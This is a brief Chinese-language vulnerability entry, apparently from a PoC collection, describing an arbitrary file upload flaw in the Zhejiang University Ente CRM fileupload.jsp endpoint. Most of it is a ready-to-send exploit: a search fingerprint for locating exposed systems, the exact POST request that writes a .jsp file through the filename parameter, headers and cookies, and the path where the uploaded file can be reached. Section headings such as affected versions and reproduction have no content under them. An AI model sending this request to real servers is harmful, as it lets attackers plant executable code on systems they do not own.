# 浙大恩特CRMfileupload.jsp任意文件上传漏洞

- **系统**：浙大恩特CRMfileupload.jsp　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="浙大恩特 CRM"`
- **请求**：`POST /entsoft_en/entereditor/jsp/fileupload.jsp?filename=123123.jsp HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=2511BA8347F6BD511B037A4B0C40DDE3; JSESSIONID=17BAFD608E509D1C96AF5715…`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 4`

**请求体 / payload**
```
test

上传文件位置
/enterdoc/uploadfile/123123.jsp
```

**其他**
- 浙大恩特CRM  fileupload.jsp 任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 浙大恩特CRM